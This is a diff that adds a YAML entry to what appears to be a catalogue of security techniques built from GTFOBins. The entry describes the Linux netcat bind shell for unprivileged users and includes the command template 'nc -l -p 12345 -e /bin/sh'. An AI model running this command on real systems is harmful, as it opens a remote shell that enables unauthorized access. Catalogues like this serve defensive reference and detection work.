@@ -1,0 +1,25 @@
+id: gtfobins/nc/bind-shell/unprivileged
+type: binary
+platform: linux
+name: nc
+phases:
+- execution
+- command-and-control
+capabilities:
+- bind-shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: nc -l -p 12345 -e /bin/sh
+  comment: This only works with netcat traditional.
+references:
+- https://gtfobins.github.io/gtfobins/nc/
+tags:
+- linux
+- unix
+- gtfobins
